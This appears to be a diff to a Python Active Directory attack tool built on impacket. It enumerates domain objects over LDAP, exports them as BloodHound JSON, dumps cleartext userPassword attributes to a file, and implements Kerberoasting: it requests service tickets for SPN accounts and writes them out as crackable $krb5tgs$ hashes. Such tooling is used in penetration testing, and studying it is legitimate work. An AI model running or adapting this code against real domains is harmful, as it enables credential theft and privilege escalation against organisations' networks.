@@ -27,6 +27,7 @@ import datetime, random
 from impacket.krb5.ccache import CCache
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.ntlm import compute_lmhash, compute_nthash
+from impacket.krb5.asn1 import TGS_REP
 
 
 class EnumAD():
@@ -57,6 +58,8 @@ class EnumAD():
         self.spn = []
         self.acl = []
         self.gpo = []
+        self.domains = []
+        self.ous = []
 
         
         self.bind()
@@ -65,6 +68,18 @@ class EnumAD():
         if bhout:
             self.outputToBloodhoundJson()
     
+        if kpre:
+            self.enumKerbPre()
+    
+        if spnEnum:
+            self.enumSPNUsers()
+        
+        self.conn.unbind()
+
+        if output:
+            self.output = output
+            self.write_file()
+        
         if enumsmb:
             # Setting variables for further testing and analysis
             self.smbShareCandidates = []
@@ -72,19 +87,8 @@ class EnumAD():
             self.sortComputers()
             self.enumSMB()
 
-        if kpre:
-            self.enumKerbPre()
-    
-        if spnEnum:
-            self.enumSPNUsers()
-        
+        # Lets clear variable now
         self.passwd = None
-        self.conn.unbind()
-
-        if output:
-            self.output = output
-            self.write_file()
-
 
     def bind(self): 
         try:
@@ -144,11 +148,22 @@ class EnumAD():
         print('[ ' + colored('OK', 'green') +' ] Got all ACL objects')
 
         # Get GPO objects
-        #self.conn.search(self.dc_string[:-1], '(&(|(objectcategory=organizationalUnit)(objectclass=domain))(gplink=*)(flags=*))', attributes=self.ldapProps, search_scope=SUBTREE)
         self.conn.search(self.dc_string[:-1], '(|(&(&(objectcategory=groupPolicyContainer)(flags=*))(name=*)(gpcfilesyspath=*))(objectcategory=organizationalUnit)(objectClass=domain))', attributes=self.ldapProps, search_scope=SUBTREE)
         for entry in self.conn.entries:
             self.gpo.append(entry)
         print('[ ' + colored('OK', 'green') +' ] Got all GPO objects')
+
+        # Get Domain
+        self.conn.search(self.dc_string[:-1], '(objectclass=domain)', attributes=self.ldapProps, search_scope=SUBTREE)
+        for entry in self.conn.entries:
+            self.domains.append(entry)
+        print('[ ' + colored('OK', 'green') +' ] Got all Domains')
+
+        # Get OUs
+        self.conn.search(self.dc_string[:-1], '(objectclass=organizationalUnit)', attributes=self.ldapProps, search_scope=SUBTREE)
+        for entry in self.conn.entries:
+            self.ous.append(entry)
+        print('[ ' + colored('OK', 'green') +' ] Got all OUs')
 
 
     '''
@@ -159,7 +174,7 @@ class EnumAD():
         passwords = {}
         for usr in usr_json['users']:
             if usr['Properties'].get('userpassword') is not None:
-                passwords.add(usr['Properties']['name'], usr['Properties']['userpassword'])
+                passwords[usr['Properties']['name']] = usr['Properties']['userpassword']
         if len(passwords.keys()) > 0:
             with open('{0}-clearpw'.format(self.server), 'w') as f:
                 json.dump(json.dumps(passwords, sort_keys=False), f) 
@@ -189,8 +204,12 @@ class EnumAD():
         }
         for pc in computers_json['computers']:
             for os_version in os_json.keys():
-                if os_version in pc['Properties'].get('operatingsystem'):
-                    os_json[os_version].append(pc['Name'])
+                try:
+                    if os_version in pc['Properties'].get('operatingsystem'):
+                        os_json[os_version].append(pc['Properties']['Name'])
+                except TypeError:
+                    # pc['Properties'].get('operatingsystem') is of NoneType, just continue
+                    continue
 
         for key, value in os_json.items():
             if len(value) == 0:
@@ -224,46 +243,96 @@ class EnumAD():
             return dn
 
 
+    def gidLookup(self, gid, groups_json):
+        for group in groups_json["groups"]:
+            sid = group["Properties"]["objectid"]
+            if sid.split('-')[-1] == gid:
+                return sid
+        return ""
+
+
     def aceLookup(self, memberOf):
         if isinstance(memberOf, str):
             # TODO: RightName is incorrect and needs a lookup
             if "Group" in memberOf:
-                return [{ "PrincipalSID": self.sidDNLookup(memberOf), "PrincipalType": "Group", "RightName": "GenericWrite", "AceType": "" }]
+                return [{ "PrincipalSID": self.sidDNLookup(memberOf), "PrincipalType": "Group", "RightName": "GenericWrite", "AceType": "", "IsInherited":False }]
             elif "User" in memberOf:
-                return [{ "PrincipalSID": self.sidDNLookup(memberOf), "PrincipalType": "User", "RightName": "GenericWrite", "AceType": "" }]
+                return [{ "PrincipalSID": self.sidDNLookup(memberOf), "PrincipalType": "User", "RightName": "GenericWrite", "AceType": "", "IsInherited":False }]
         elif isinstance(memberOf, list):
             retList = []
             for grp in memberOf:
                 # TODO: RightName is incorrect and needs a lookup
                 if "Group" in grp:
-                    retList.append({ "PrincipalSID": self.sidDNLookup(grp), "PrincipalType": "Group", "RightName": "GenericWrite", "AceType": "" })
+                    retList.append({ "PrincipalSID": self.sidDNLookup(grp), "PrincipalType": "Group", "RightName": "GenericWrite", "AceType": "", "IsInherited":False })
                 elif "User" in grp:
-                    retList.append({ "PrincipalSID": self.sidDNLookup(grp), "PrincipalType": "User", "RightName": "GenericWrite", "AceType": "" })
+                    retList.append({ "PrincipalSID": self.sidDNLookup(grp), "PrincipalType": "User", "RightName": "GenericWrite", "AceType": "", "IsInherited":False })
             return retList
         else:
-            return [{ "PrincipalName": "", "PrincipalType": "", "RightName": "", "AceType": "" }]
+            return [{ "PrincipalSID": "", "PrincipalType": "", "RightName": "", "AceType": "", "IsInherited":False }]
         
-        return [{ "PrincipalName": "", "PrincipalType": "", "RightName": "", "AceType": "" }]
-
+        return [{ "PrincipalSID": "", "PrincipalType": "", "RightName": "", "AceType": "", "IsInherited":False }]
 
 
     def memberLookup(self, member):
-        if isinstance(member, str):
-            if "User" in member:
-                return [{ "MemberName": member.split(',')[0][-3:], "MemberType": "user" }]
-        if isinstance(member, list):
-            retList = []
-            for mem in member:
-                if "User" in mem:
-                    retList.append({ "MemberName": mem.split(',')[0][-3:], "MemberType": "user" })
-        else:
-            return [{ "MemberName": "", "MemberType": "" }]
+        try:
+            if isinstance(member, str):
+                if "User" in member:
+                    memDict = [lst for lst in self.people if str(member) in lst.entry_to_json()]
+                    return [{ "MemberId": str(memDict[0]['objectSid']), "MemberType": "user" }]
+            if isinstance(member, list):
+                retList = []
+                for mem in member:
+                    memDict = [lst for lst in self.people if str(mem) in lst.entry_to_json()]
+                    if "User" in mem:
+                        retList.append({ "MemberId": str(memDict[0]['objectSid']), "MemberType": "user" })
+            else:
+                return [{ "MemberId": "", "MemberType": "" }]
+        except IndexError:
+            # For some remotely unimaginable reason, the member couldnt be found in the people dump
+            return [{ "MemberId": "", "MemberType": "" }]
 
     
     def boolConvert(self, highVal):
         if highVal == 1:
             return True
+        if highVal:
+            return True
         return False
+
+
+    def hasSPN(self, spnProperty):
+        if spnProperty is not None:
+            return True
+        return False
+
+
+    def stripGUID(self, guid):
+        retGUID = guid
+        for rep in (('{', ''), ('}', '')):
+            retGUID = retGUID.replace(*rep)
+        return retGUID
+
+
+    def memberOfDom(self, dn):
+        belongsTo = ""
+        dnSplit = dn.split(',')
+        for sub in dnSplit:
+            if 'DC' in sub:
+                try:
+                    belongsTo += sub.split('=')[1]
+                    belongsTo += '.'
+                except IndexError:
+                    continue
+        return belongsTo
+
+
+    def placedInOU(self, computers, DN):
+        retList = []
+        for computer in computers["computers"]:
+            compDN = computer["Properties"]["distinguishedname"]
+            if DN.split(',') == compDN.split(',')[1:]:
+                retList.append(computer["Properties"]["objectid"])
+        return retList
 
 
     def outputToBloodhoundJson(self):
@@ -272,30 +341,51 @@ class EnumAD():
             ],
             "meta": {
                 "type": "computers",
-                "count": len(self.computers)
+                "count": len(self.computers),
+                "version": 3
             }
         }
         users_json = { "users": [
             ],
             "meta": {
                 "type": "users",
-                "count": len(self.people)
+                "count": len(self.people),
+                "version": 3
             }
         }
         groups_json = { "groups": [
             ],
             "meta": {
                 "type": "groups",
-                "count": len(self.groups)
+                "count": len(self.groups),
+                "version": 3
             }
         }
         gpos_json = { "gpos": [
             ],
             "meta": {
                 "type": "gpos",
-                "count": len(self.gpo)
+                "count": len(self.gpo),
+                "version": 3
             }
         }
+        domain_json = { "domains": [
+            ],
+            "meta": {
+                "type": "domains",
+                "count": len(self.domains), 
+                "version": 3
+            }
+        }
+        ou_json = { "ous": [
+            ],
+            "meta": {
+                "type": "ous",
+                "count": len(self.ous),
+                "version": 3
+            }
+        }
+
         self.group_sid_lookup = {
         }
         self.group_sid_dn_lookup = {
@@ -307,13 +397,14 @@ class EnumAD():
             self.group_sid_lookup[self.splitJsonArr(group['attributes'].get('objectSid')).split('-')[-1:][0]] = str(self.splitJsonArr(group['attributes'].get('cn'))) + '@{0}'.format(self.server)
             self.group_sid_dn_lookup[self.splitJsonArr(group['attributes'].get('distinguishedName'))] = self.splitJsonArr(group['attributes'].get('objectSid'))
             groups_json["groups"].append({
-                "Name": self.splitJsonArr(group['attributes'].get('name')) + domName,
                 "Properties": {
-                    "highvalue": self.splitJsonArr(group['attributes'].get('isCriticalSystemObject')),
+                    "highvalue": self.boolConvert(self.splitJsonArr(group['attributes'].get('isCriticalSystemObject'))),
+                    "Name": self.splitJsonArr(group['attributes'].get('name')) + domName,
                     "domain": self.server,
-                    "objectsid": self.splitJsonArr(group['attributes'].get('objectSid')),
-                    "admincount": self.splitJsonArr(group['attributes'].get('adminCount')),
-                    "description": self.splitJsonArr(group['attributes'].get('description'))
+                    "objectid": self.splitJsonArr(group['attributes'].get('objectSid')),
+                    "distinguishedname": self.splitJsonArr(group['attributes'].get('distinguishedName')),
+                    "description": self.splitJsonArr(group['attributes'].get('description')),
+                    "admincount": self.boolConvert(self.splitJsonArr(group['attributes'].get('adminCount')))
                 },
                 "Aces": self.aceLookup(self.splitJsonArr(group['attributes'].get('member'))), 
                 "Members": self.memberLookup(self.splitJsonArr(group['attributes'].get('member'))) 
@@ -325,27 +416,32 @@ class EnumAD():
         for entry in self.computers:
             computer = json.loads(self.computers[idx].entry_to_json())
             computers_json["computers"].append({
-                "Name": self.splitJsonArr(computer['attributes'].get('name')) + '.{0}'.format(self.server),
-                "PrimaryGroup": self.sidLookup(str(self.splitJsonArr(computer['attributes'].get('primaryGroupID')))),
                 "Properties": {
-                    "objectsid": self.splitJsonArr(computer['attributes'].get('objectSid')),
-                    "highvalue": self.splitJsonArr(computer['attributes'].get('isCriticalSystemObject')),
+                    "highvalue": self.boolConvert(self.splitJsonArr(computer['attributes'].get('isCriticalSystemObject'))),
+                    "Name": self.splitJsonArr(computer['attributes'].get('name')) + '.{0}'.format(self.server),
                     "domain": self.server,
-                    # Set to true since it wouldnt return otherwise due to the ldap filter
-                    "enabled": True, 
-                    # TODO: Fix
-                    "unconstraineddelegation": False,
-                    "lastlogon": self.splitJsonArr(computer['attributes'].get('lastLogon')),
-                    "pwdlastset": self.splitJsonArr(computer['attributes'].get('pwdLastSet')),
-                    "serviceprincipalnames": self.splitJsonArr(computer['attributes'].get('servicePrincipalName')),
-                    "operatingsystem": self.splitJsonArr(computer['attributes'].get('operatingSystem')),
+                    "objectid": self.splitJsonArr(computer['attributes'].get('objectSid')),
+                    "distinguishedname": self.splitJsonArr(computer['attributes'].get('distinguishedName')),
                     "description": self.splitJsonArr(computer['attributes'].get('description')),
-            },
-            # TODO: Fix
-            "LocalAdmins": [],
-            "RemoteDesktopUsers": [],
-            "DcomUsers": [],
-            "AllowedToDelegate": self.splitJsonArr(computer['attributes'].get('msds-allowedToDelegateTo'))})
+                    "enabled": True, 
+                    "serviceprincipalnames": self.splitJsonArr(computer['attributes'].get('servicePrincipalName')),
+                    "lastlogontimestamp": self.splitJsonArr(computer['attributes'].get('lastLogonTimestamp')),
+                    "pwdlastset": self.splitJsonArr(computer['attributes'].get('pwdLastSet')),
+                    "operatingsystem": self.splitJsonArr(computer['attributes'].get('operatingSystem')),
+                    # TODO: Fix
+                    "haslaps": False,
+                    "unconstraineddelegation": False
+                },
+                "AllowedToAct": [],
+                "PrimaryGroupSid": self.gidLookup(str(self.splitJsonArr(computer['attributes'].get('primaryGroupID'))), groups_json),
+                "Sessions": [],
+                "LocalAdmins": [],
+                "RemoteDesktopUsers": [],
+                "DcomUsers": [],
+                "ObjectIdentifier": self.splitJsonArr(computer['attributes'].get('objectSid')),
+                "AllowedToDelegate": self.splitJsonArr(computer['attributes'].get('msds-allowedToDelegateTo', [])),
+                "Aces": self.aceLookup(self.splitJsonArr(computer['attributes'].get('memberOf')))
+            })
             idx += 1
         print('[ ' + colored('OK', 'green') +' ] Converted all Computer objects to Json format')
         
@@ -362,7 +458,7 @@ class EnumAD():
                     "lastlogon": self.splitJsonArr(user['attributes'].get('lastLogon')),
                     "pwdlastset": self.splitJsonArr(user['attributes'].get('pwdLastSet')),
                     "serviceprincipalnames": self.splitJsonArr(user['attributes'].get('servicePrincipalName')),
-                    "hasspn": self.splitJsonArr(user['attributes'].get('servicePrincipalName')),
+                    "hasspn": self.hasSPN(self.splitJsonArr(user['attributes'].get('servicePrincipalName'))),
                     "displayname": self.splitJsonArr(user['attributes'].get('displayName')),
                     "email": self.splitJsonArr(user['attributes'].get('mail')),
                     "title": self.splitJsonArr(user['attributes'].get('title')),
@@ -370,10 +466,24 @@ class EnumAD():
                     "description": self.splitJsonArr(user['attributes'].get('description')),
                     "userpassword": self.splitJsonArr(user['attributes'].get('userPassword')),
                     "admincount": self.boolConvert(self.splitJsonArr(user['attributes'].get('adminCount'))),
-                    "PrimaryGroup": self.sidLookup(str(self.splitJsonArr(user['attributes'].get('primaryGroupID')))), 
+                    "displayname": self.splitJsonArr(user['attributes'].get('displayName')),
+                    # TODO: Test if key from .get is correct
+                    "dontreqpreauth": self.splitJsonArr(user['attributes'].get('dontRequirePreauth', False)),
+                    # TODO: Test if key from .get is correct
+                    "passwordnotreqd": self.splitJsonArr(user['attributes'].get('msDS-UserPasswordNotRequired', True)),
+                    "highvalue": self.boolConvert(self.splitJsonArr(user['attributes'].get('isCriticalSystemObject'))),
+                    "unconstraineddelegation": False,
+                    "sensitive": False,
+                    "pwdneverexpires": self.splitJsonArr(user['attributes'].get('msDS-UserPasswordExpiryTimeComputed', False)),
+                    "sidhistory": []
                 },
+                "PrimaryGroup": self.sidLookup(str(self.splitJsonArr(user['attributes'].get('primaryGroupID')))), 
+                "ObjectIdentifier": self.splitJsonArr(user['attributes'].get('objectSid')),
                 "Aces": self.aceLookup(self.splitJsonArr(user['attributes'].get('memberOf'))),
-                "AllowedToDelegate": []
+                # TODO: Fix all below
+                "AllowedToDelegate": self.splitJsonArr(user['attributes'].get('msDS-AllowedToDelegateTo', [])),
+                "SPNTargets": [],
+                "HasSIDHistory": self.splitJsonArr(user['attributes'].get('sIDHistory', [])),
             })
             idx += 1
 
@@ -383,17 +493,83 @@ class EnumAD():
         for entry in self.gpo:
             gpo = json.loads(self.gpo[idx].entry_to_json())
             gpos_json["gpos"].append({
-                "Name": self.splitJsonArr(gpo['attributes'].get('name')) + domName,
                 "Properties": {
-                    "highvalue": self.splitJsonArr(gpo['attributes'].get('isCriticalSystemObject')), 
+                    "highvalue": self.boolConvert(self.splitJsonArr(gpo['attributes'].get('isCriticalSystemObject'))), 
+                    "Name": self.splitJsonArr(gpo['attributes'].get('name')) + domName,
+                    "domain": self.memberOfDom(self.splitJsonArr(gpo['attributes'].get('name'))),
+                    "objectid": self.stripGUID(self.splitJsonArr(gpo['attributes'].get('objectGUID'))),
+                    "distinguishedname": self.splitJsonArr(gpo['attributes'].get('distinguishedName')),
                     "description": self.splitJsonArr(gpo['attributes'].get('description')),
                     "gpcpath": self.splitJsonArr(gpo['attributes'].get('gPCFileSysPath')) 
                 },
-                "Guid": self.splitJsonArr(gpo['attributes'].get('objectGUID')),
+                "ObjectIdentifier": self.stripGUID(self.splitJsonArr(gpo['attributes'].get('objectGUID'))),
                 "Aces": self.aceLookup(self.splitJsonArr(gpo['attributes'].get('')))
             })
             idx += 1
         print('[ ' + colored('OK', 'green') +' ] Converted all GPO objects to Json format')
+
+        idx = 0
+        for entry in self.domains:
+            domain = json.loads(self.domains[idx].entry_to_json())
+            domain_json["domains"].append({
+                "Properties": {
+                    "highvalue": self.boolConvert(self.splitJsonArr(domain['attributes'].get('isCriticalSystemObject'))),
+                    "name": self.memberOfDom(self.splitJsonArr(domain['attributes'].get('name'))),
+                    "domain": self.memberOfDom(self.splitJsonArr(domain['attributes'].get('name'))),
+                    "objectid": self.splitJsonArr(domain['attributes'].get('objectSid')),
+                    "distinguishedname": self.splitJsonArr(domain['attributes'].get('distinguishedName')),
+                    "description": self.splitJsonArr(domain['attributes'].get('description')),
+                    "functionallevel": "",
+                },
+                "Users": [sid["Properties"].get("objectid",[]) for sid in users_json["users"]],
+                "Computers": [],
+                "ChildOus": [],
+                "Trusts": [],
+                "Links": [{
+                    "IsEnforced": "",
+                    "Guid": "" #[guid["Properties"].get("objectid",[]) for guid in gpos_json["gpos"]]
+                }],
+                "RemoteDesktopUsers": [],
+                "LocalAdmins": [],
+                "DcomUsers": [],
+                "PSRemoteUsers": [],
+                "ObjectIdentifier": self.splitJsonArr(domain['attributes'].get('objectSid')),
+                "Aces": self.aceLookup(self.splitJsonArr(domain['attributes'].get('')))
+            })
+            idx += 1
+        print('[ ' + colored('OK', 'green') +' ] Converted all Domain objects to Json format')
+
+        idx = 0
+        for entry in self.ous:
+            ou = json.loads(self.ous[idx].entry_to_json())
+            ou_json["ous"].append({
+                "Properties": {
+                    "highvalue": self.boolConvert(self.splitJsonArr(ou['attributes'].get('isCriticalSystemObject'))),
+                    "name": str(self.splitJsonArr(ou['attributes'].get('name'))) + '@{0}'.format(self.server),
+                    "objectid": self.stripGUID(self.splitJsonArr(ou['attributes'].get('objectGUID'))),
+                    "distinguishedname": self.splitJsonArr(ou['attributes'].get('distinguishedName')),
+                    "description": self.splitJsonArr(ou['attributes'].get('description')),
+                    "blocksinheritance": self.boolConvert(""),
+                    #"blocksinheritance": self.splitJsonArr(ou['attributes'].get('')),
+                    "domain": self.memberOfDom(self.splitJsonArr(ou['attributes'].get('distinguishedName')))[:-1],
+                },
+                "Links": [{
+                    "IsEnforced": False,
+                    "Guid": ""#[guid["Properties"].get("objectid",[]) for guid in gpos_json["gpos"]]
+                }],
+                "ACLProtected": "",
+                "Users": [],
+                "Computers": self.placedInOU(computers_json, self.splitJsonArr(ou['attributes'].get('distinguishedName'))),
+                "ChildOus": [],
+                "RemoteDesktopUsers": [],
+                "LocalAdmins": [],
+                "DcomUsers": [],
+                "PSRemoteUsers": [],
+                "ObjectIdentifier": self.stripGUID(self.splitJsonArr(ou['attributes'].get('objectGUID'))),
+                "Aces":  self.aceLookup(self.splitJsonArr(ou['attributes'].get('')))
+            })
+            idx += 1
+        print('[ ' + colored('OK', 'green') +' ] Converted all OUs to Json format')
 
         with open('{0}-computers.json'.format(self.server), 'w') as f:
             json.dump(computers_json, f, sort_keys=False)
@@ -403,6 +579,10 @@ class EnumAD():
             json.dump(groups_json, f, sort_keys=False)
         with open('{0}-gpos.json'.format(self.server), 'w') as f:
             json.dump(gpos_json, f, sort_keys=False)
+        with open('{0}-domain.json'.format(self.server), 'w') as f:
+            json.dump(domain_json, f, sort_keys=False)
+        with open('{0}-ous.json'.format(self.server), 'w') as f:
+            json.dump(ou_json, f, sort_keys=False)
 
         print('[ ' + colored('OK', 'green') +' ] Wrote all objects to Json format')
 
@@ -500,6 +680,14 @@ class EnumAD():
             for item in self.gpo:
                 f.write(str(item))
                 f.write("\n")
+        with open(str(self.output) + '-domains', 'w') as f:
+            for item in self.domains:
+                f.write(str(item))
+                f.write("\n")
+        with open(str(self.output) + '-ous', 'w') as f:
+            for item in self.ous:
+                f.write(str(item))
+                f.write("\n")
 
         print('[ ' + colored('OK', 'green') +' ] Wrote all files to {0}-obj_name'.format(self.output))
 
@@ -591,25 +779,71 @@ class EnumAD():
     def enumSPNUsers(self):
         users_spn = {
         }
+        user_tickets = {
+        }
+
+        userDomain = self.domuser.split('@')[1]
 
         idx = 0
         for entry in self.spn:
             spn = json.loads(self.spn[idx].entry_to_json())
             users_spn[self.splitJsonArr(spn['attributes'].get('name'))] = self.splitJsonArr(spn['attributes'].get('servicePrincipalName')) 
             idx += 1    
-        print(users_spn.values())
 
         # Get TGT for the supplied user
         client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         try:
-            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', self.server, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=self.server)
+            # We need to take the domain from the user@domain since it *could* be a cross-domain user
+            tgt, cipher, oldSession, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=None)
 
             TGT = {}
             TGT['KDC_REP'] = tgt
             TGT['cipher'] = cipher
             TGT['sessionKey'] = newSession
     
-            print(TGT)
+            for user, spns in users_spn.items():
+                if isinstance(spns, list):
+                    # We only really need one to get a ticket
+                    spn = spns[0]
+                else:
+                    spn = spns
+                    try:
+                        # Get the TGS
+                        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                        tgs, cipher, oldSession, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
+                        # Decode the TGS
+                        decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+                        # Get different encryption types
+                        if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
+                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
+                            user_tickets[spn] = entry
+                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
+                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+                            user_tickets[spn] = entry
+
+                    except KerberosError:
+                        # For now continue
+                        # TODO: Maybe look deeper into issue here
+                        continue
+
+            if len(user_tickets.keys()) > 0:
+                with open('{0}-spn-tickets'.format(self.server), 'w') as f:
+                    for key, value in user_tickets.items():
+                        #json.dump(user_tickets, f, sort_keys=False)
+                        f.write('{0}:{1}\n'.format(key, value))
+                if len(user_tickets.keys()) == 1:
+                    print('[ ' + colored('OK', 'yellow') +' ] Wrote {0} ticket for Kerberoasting'.format(len(user_tickets.keys())))
+                else:
+                    print('[ ' + colored('OK', 'yellow') +' ] Wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
+            else:
+                print('[ ' + colored('OK', 'green') +' ] Wrote {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
+
 
         except KerberosError as err:
             print('[ ' + colored('NOT OK', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
